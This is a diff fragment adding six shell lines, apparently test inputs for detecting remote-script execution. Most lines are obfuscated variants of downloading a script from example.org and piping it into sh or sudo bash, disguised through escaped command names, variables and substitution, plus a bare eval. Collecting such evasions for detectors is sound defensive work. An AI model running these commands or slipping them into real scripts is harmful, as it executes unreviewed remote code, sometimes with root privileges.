@@ -1,0 +1,6 @@
+$'\x63url' https://example.org/i.sh | sh
+c=curl; $c https://example.org/i.sh | sh
+$(echo curl) https://example.org/i.sh | sh
+eval "$x"
+$HOME/bin/tool | sh
+sudo $c https://example.org/i.sh | sudo bash
